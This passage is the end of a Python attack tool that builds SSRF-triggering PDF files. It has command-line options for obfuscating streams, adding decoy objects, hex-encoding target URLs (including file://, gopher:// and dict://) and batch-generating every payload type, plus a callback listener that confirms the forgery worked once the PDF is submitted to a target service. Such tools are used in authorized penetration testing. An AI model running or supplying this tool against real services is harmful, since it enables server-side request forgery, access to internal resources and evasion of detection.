                        help='Enable ASCIIHexDecode obfuscation on streams')
    parser.add_argument('--junk', type=int, default=0,
                        help='Number of junk/decoy objects to add (default: 0)')
    parser.add_argument('--hex-url', action='store_true',
                        help='Encode URL as PDF hex string <hex> instead of literal (str)')
    parser.add_argument('--batch', '-b', action='store_true',
                        help='Generate all payload types in batch mode')
    parser.add_argument('--output-dir', default='./ssrf_output',
                        help='Output directory for batch mode (default: ./ssrf_output)')
    parser.add_argument('--listen', '-l', type=int, metavar='PORT',
                        help='Start callback listener on specified port')
    parser.add_argument('--timeout', type=int, default=30,
                        help='Callback listener timeout in seconds (default: 30)')
    parser.add_argument('--verbose', '-v', action='store_true',
                        help='Enable verbose/debug output')

    args = parser.parse_args()

    # Set log level
    if args.verbose:
        logger.setLevel(logging.DEBUG)

    # Validate URL
    if not validate_url(args.url):
        logger.error(f"Invalid URL: {args.url}")
        logger.error("URL must start with http://, https://, ftp://, file://, gopher://, or dict://")
        sys.exit(1)

    # Mode check
    if not args.batch and not args.type:
        parser.error("Either --type or --batch must be specified")

    # Start callback listener if requested
    listener_server = None
    listener_thread = None
    if args.listen:
        try:
            listener_server, listener_thread = start_callback_server(
                port=args.listen, timeout=args.timeout
            )
        except OSError as e:
            logger.error(f"Failed to start listener on port {args.listen}: {e}")
            sys.exit(1)

    # Generate PDFs
    if args.batch:
        batch_generate(
            url=args.url,
            output_dir=args.output_dir,
            compress=args.compress,
            obfuscate=args.obfuscate,
            junk_count=args.junk,
            hex_url=args.hex_url
        )
    else:
        builder = PDFBuilder(
            compress=args.compress,
            obfuscate=args.obfuscate,
            junk_count=args.junk,
            hex_url=args.hex_url
        )
        build_func = BUILD_FUNCTIONS[args.type]
        build_func(args.url, builder)
        builder.generate(args.output)
        logger.info(f"SSRF test PDF ({args.type}) saved to: {args.output}")

    # Wait for callback if listener is active
    if listener_thread:
        logger.info(f"Waiting for callback (timeout: {args.timeout}s)...")
        logger.info("Submit the generated PDF to the target service now.")
        listener_thread.join(timeout=args.timeout + 5)

        if CallbackHandler.triggered:
            logger.info("=" * 60)
            logger.info("SSRF CONFIRMED — Callback received!")
            logger.info("=" * 60)
            for detail in CallbackHandler.request_details:
                logger.info(f"  Method: {detail['method']}")
                logger.info(f"  Path: {detail['path']}")
                logger.info(f"  Client: {detail['client']}")
                logger.info(f"  Time: {detail['timestamp']}")
                if 'body' in detail and detail['body']:
                    logger.info(f"  Body: {detail['body'][:500]}")
                logger.info("-" * 40)

            # Save callback details
            cb_report_path = args.output.replace('.pdf', '_callback.json') if not args.batch else os.path.join(args.output_dir, 'callback_report.json')
            with open(cb_report_path, 'w') as f:
                json.dump(CallbackHandler.request_details, f, indent=2)
            logger.info(f"Callback details saved to: {cb_report_path}")
        else:
            logger.warning("No callback received within timeout period.")
            logger.info("This may indicate:")
            logger.info("  - Target does not process the PDF type used")
            logger.info("  - Network connectivity issues")
            logger.info("  - Target has SSRF protections in place")


if __name__ == '__main__':
    main()